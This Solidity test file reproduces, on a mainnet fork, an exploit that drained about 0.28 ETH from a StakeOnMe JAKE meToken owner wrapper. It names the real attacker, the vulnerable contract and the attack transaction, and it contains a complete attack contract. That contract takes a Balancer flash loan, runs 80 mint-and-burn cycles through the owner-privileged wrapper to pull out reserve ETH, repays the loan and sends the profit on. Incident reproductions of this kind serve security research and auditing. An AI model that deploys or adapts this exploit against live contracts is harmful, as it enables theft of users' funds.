// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 0.28 ETH
// Attacker : 0xbdcdc1d072dfd2a1401e88959c31071fc585ce8e
// Attack Contract : 0x8a9be1b19895798287a5a9b64db3d133e0297cda
// Vulnerable Contract : 0x237d59bf98ec4f4f013bc35d66f22d2bc9504b3f
// Victim : 0x237d59bf98ec4f4f013bc35d66f22d2bc9504b3f
// Attack Tx : https://etherscan.io/tx/0xed71e72ba1be2cff06438fab558a79936414d24dd1f6d3e58ecadc2a8f673fe5

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x237d59bf98ec4f4f013bc35d66f22d2bc9504b3f#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2034532549905580417
//
// The JAKE meToken owner is an unverified public wrapper. The attacker repeatedly minted JAKE through the wrapper's
// payable path, then burned the freshly minted balance through the same owner-privileged wrapper. Because the burn is
// routed by the token owner, the wrapper pays out more ETH than the raw mint cost and drains reserve value over 80
// traced cycles before repaying a zero-fee Balancer WETH flash loan.

address constant ATTACKER = 0xbDcdC1D072DFd2a1401e88959c31071FC585CE8E;
address constant STAKEONME_OWNER_WRAPPER = 0x237d59bF98Ec4f4F013bc35D66f22d2Bc9504b3F;
address constant JAKE_METOKEN = 0x277697FA7C134A7Fcc2AAAf812Bdf1FD8b68B818;
address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

uint256 constant WETH_FLASH_AMOUNT = 1.5 ether;

interface IStakeOnMeOwnerWrapper {
    function burn(
        uint256 amount
    ) external;

    function poolBalance() external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 24_664_322;
        vm.createSelectFork("mainnet", forkBlock);
        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(STAKEONME_OWNER_WRAPPER, "StakeOnMe JAKE Owner Wrapper");
        vm.label(JAKE_METOKEN, "JAKE meToken");
        vm.label(BALANCER_VAULT, "Balancer Vault");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        assertEq(IERC20(JAKE_METOKEN).owner(), STAKEONME_OWNER_WRAPPER, "unexpected JAKE owner");

        StakeOnMeAttack attack = new StakeOnMeAttack(ATTACKER);
        vm.label(address(attack), "Local Attack Contract");

        uint256 attackerEthBefore = ATTACKER.balance;
        uint256 wrapperPoolBefore = IStakeOnMeOwnerWrapper(STAKEONME_OWNER_WRAPPER).poolBalance();

        attack.run();

        uint256 attackerProfit = ATTACKER.balance - attackerEthBefore;
        uint256 wrapperPoolAfter = IStakeOnMeOwnerWrapper(STAKEONME_OWNER_WRAPPER).poolBalance();

        emit log_named_decimal_uint("Attacker ETH profit", attackerProfit, 18);
        emit log_named_decimal_uint("Wrapper pool balance before", wrapperPoolBefore, 18);
        emit log_named_decimal_uint("Wrapper pool balance after", wrapperPoolAfter, 18);

        assertGt(attackerProfit, 0.27 ether, "ETH profit below traced impact");
        assertLt(wrapperPoolAfter, wrapperPoolBefore, "wrapper pool balance did not decrease");
        assertEq(IERC20(WETH_TOKEN).balanceOf(address(attack)), 0, "WETH left on helper");
        assertEq(IERC20(JAKE_METOKEN).balanceOf(address(attack)), 0, "JAKE left on helper");
        assertEq(address(attack).balance, 0, "ETH left on helper");
    }
}

contract StakeOnMeAttack {
    address private immutable profitReceiver;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    receive() external payable {}

    function run() external {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH_TOKEN;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = WETH_FLASH_AMOUNT;

        // step 1: borrow the same 1.5 WETH from Balancer.
        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "caller must be Balancer");
        require(tokens.length == 1 && tokens[0] == WETH_TOKEN, "unexpected flash token");
        require(amounts[0] == WETH_FLASH_AMOUNT, "unexpected flash amount");
        require(feeAmounts[0] == 0, "unexpected Balancer fee");

        // step 2: unwrap the WETH flash loan to fund the owner-wrapper mint path.
        IWETH(payable(WETH_TOKEN)).withdraw(amounts[0]);

        // step 3: run the three trace-supported mint groups and derive each burn amount from the minted JAKE balance.
        _mintAndBurnGroup(0.025 ether, 40);
        _mintAndBurnGroup(0.01 ether, 30);
        _mintAndBurnGroup(0.005 ether, 10);

        // step 4: rewrap and repay the zero-fee Balancer loan, then forward the native ETH profit.
        uint256 debt = amounts[0] + feeAmounts[0];
        require(address(this).balance > debt, "cycle did not produce profit");
        IWETH(payable(WETH_TOKEN)).deposit{value: debt}();
        require(IERC20(WETH_TOKEN).transfer(BALANCER_VAULT, debt), "repay WETH");

        _sweepProfit();
    }

    function _mintAndBurnGroup(
        uint256 mintValue,
        uint256 count
    ) private {
        bytes4 preBurnSelector = 0xcfd26d5d;

        for (uint256 i = 0; i < count; ++i) {
            uint256 balanceBefore = IERC20(JAKE_METOKEN).balanceOf(address(this));

            (bool minted,) = payable(STAKEONME_OWNER_WRAPPER).call{value: mintValue}("");
            require(minted, "owner-wrapper mint failed");

            uint256 mintedAmount = IERC20(JAKE_METOKEN).balanceOf(address(this)) - balanceBefore;
            require(mintedAmount > 0, "no JAKE minted");

            (bool prepared,) = STAKEONME_OWNER_WRAPPER.call(abi.encodeWithSelector(preBurnSelector));
            require(prepared, "pre-burn call failed");

            IStakeOnMeOwnerWrapper(STAKEONME_OWNER_WRAPPER).burn(mintedAmount);
            require(IERC20(JAKE_METOKEN).balanceOf(address(this)) == balanceBefore, "JAKE not burned");
        }
    }

    function _sweepProfit() private {
        uint256 profit = address(this).balance;
        if (profit != 0) {
            (bool sent,) = payable(profitReceiver).call{value: profit}("");
            require(sent, "profit transfer failed");
        }
    }
}
